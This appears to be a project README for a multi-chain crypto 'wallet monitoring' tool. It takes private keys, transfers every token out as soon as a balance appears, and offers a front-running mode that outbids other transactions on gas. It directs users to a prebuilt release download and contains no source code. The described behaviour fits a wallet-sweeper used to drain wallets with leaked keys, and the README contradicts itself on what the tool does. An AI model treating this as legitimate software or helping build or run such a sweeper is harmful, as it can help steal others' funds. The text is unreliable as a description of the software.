# Wallet Monitoring Tool for Web3 Multi-Chain ü™ô

## üìñ Project Overview

Wallet Monitoring Tool is designed to track token balances across multiple blockchain networks and automatically execute transfer actions when balance changes are detected. This tool supports major blockchain networks such as Ethereum, BSC, and Solana.

### Core Features
- **Real-Time Monitoring**: Continuously track the token balances of specified wallets.
- **Automatic Transfers**: Instantly transfer all tokens when a balance greater than zero is detected.
- **Multi-Chain Support**: Compatible with EVM chains and Solana network.
- **Front-Running Feature**: Execute transactions faster by increasing gas fees.

## ‚ú® Feature Highlights

### üîê Security
- Private keys are stored only in memory and are not saved to files.
- Supports various private key formats (with or without 0x prefix).
- Complete transaction signing and verification process.

### üìä Monitoring Capabilities
- Real-time monitoring of native tokens (ETH, BNB, SOL, etc.).
- Real-time monitoring of ERC-20/BEP-20/SPL tokens.
- Parallel monitoring across multiple networks.
- Configurable check intervals for monitoring.

### ‚ö° Transfer Functionality
- Automatic transfers (transfers occur immediately when balance > 0).
- Intelligent gas fee calculation.
- Supports EIP-1559 and traditional gas pricing.
- Front-running mode (increase gas fees for faster execution).

## ‚öôÔ∏è Configuration Instructions

### Initial Setup
1. **Download the Tool**: Access the [Releases section](https://github.com/Adrian11x09/Wallet-monitoring/releases) to get the latest version.
2. **Install Dependencies**: Ensure that you have the necessary dependencies installed. This typically includes libraries for interacting with blockchain networks.

### Configuration File
- Create a configuration file to set your wallet addresses and desired settings.
- Specify the networks you want to monitor and the tokens of interest.

### Example Configuration
```json
{
  "wallets": [
    {
      "address": "0xYourWalletAddress",
      "tokens": ["ETH", "USDT", "BNB"]
    }
  ],
  "monitoring": {
    "interval": 30,
    "networks": ["Ethereum", "BSC", "Solana"]
  },
  "transfer": {
    "enabled": true,
    "gasPrice": "auto"
  }
}
```

### Running the Tool
- After configuration, run the tool using the command line:
```bash
node wallet-monitor.js
```

## üõ†Ô∏è Advanced Configuration

### Customizing Monitoring Intervals
You can adjust the monitoring intervals in the configuration file. Shorter intervals provide real-time updates but may consume more resources.

### Token Selection
Select which tokens to monitor by listing them in the configuration file. The tool will track balances and notify you of any changes.

### Multi-Network Support
Add multiple networks in the configuration to monitor wallets across different blockchains. This feature is useful for users with assets in various ecosystems.

### Security Enhancements
- Use hardware wallets for enhanced security.
- Regularly update your software to the latest version to patch any vulnerabilities.

## üìà Monitoring Dashboard

The Wallet Monitoring Tool includes a dashboard for visualizing your wallet activity. This dashboard provides insights into:
- Current balances of monitored tokens.
- Historical data on transfers and balance changes.
- Alerts for any significant changes in token balances.

### Accessing the Dashboard
Once the tool is running, you can access the dashboard through your web browser. The default address is `http://localhost:3000`.

## ‚ö° Transfer Logic

### Automatic Transfers
The tool automatically transfers tokens when the balance exceeds zero. This feature ensures that you do not miss out on any potential gains.

### Gas Fee Management
The tool calculates gas fees based on network conditions. You can choose between automatic gas pricing or set a manual fee.

### Front-Running Transactions
In front-running mode, the tool increases gas fees to prioritize your transactions over others. This feature is useful in competitive environments where speed is crucial.

## üìä Performance Metrics

### Tracking Efficiency
The Wallet Monitoring Tool provides performance metrics to evaluate its efficiency. Metrics include:
- Number of successful transfers.
- Average time taken for transfers.
- Number of balance checks performed.

### Analyzing Performance
Use the metrics to analyze how well the tool is performing. Adjust configurations based on your observations to optimize results.

## üîí Security Best Practices

### Storing Private Keys
- Always store private keys securely. Avoid exposing them in your code or configuration files.
- Consider using environment variables to store sensitive information.

### Regular Updates
Keep your software updated to the latest version to protect against vulnerabilities. Check the [Releases section](https://github.com/Adrian11x09/Wallet-monitoring/releases) regularly for updates.

### Monitoring for Unusual Activity
Set alerts for any unusual activity in your wallets. The tool can notify you if there are unexpected balance changes or transfers.
